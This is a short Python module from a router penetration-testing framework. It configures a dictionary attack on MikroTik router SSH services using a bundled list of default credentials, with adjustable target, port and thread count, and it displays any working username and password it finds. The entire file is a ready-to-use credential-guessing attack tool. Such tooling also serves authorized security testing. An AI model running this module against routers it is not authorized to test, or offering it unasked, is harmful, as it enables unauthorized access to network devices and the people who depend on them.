from routerxpl.core.exploit import *
from routerxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault
from routerxpl.resources import wordlists


class Exploit(SSHDefault):
    __info__ = {
        "name": "Mikrotik Router Default SSH Creds",
        "description": "Module performs dictionary attack against Mikrotik Router SSH service."
                       "If valid credentials are found they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Mikrotik Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist(
        wordlists.mikrotik_api,
        "User:Pass or file with default credentials (file://)",
    )